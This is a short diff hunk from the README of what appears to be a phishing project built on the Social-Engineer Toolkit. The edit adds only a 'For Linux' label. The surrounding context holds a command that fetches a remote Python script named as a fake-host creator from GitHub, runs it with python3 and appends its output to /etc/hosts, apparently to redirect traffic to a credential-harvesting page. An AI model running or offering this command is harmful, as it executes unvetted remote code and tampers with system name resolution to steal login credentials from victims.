@@ -20,6 +20,7 @@ setoolkit
 ```
 
 3. -
+- For Linux
 ```bash
 curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-login-credentials/master/hosts/modules/pyexploitcreate/pyexploitcreateIP_host_fake.py | python3 >> /etc/hosts
 ```
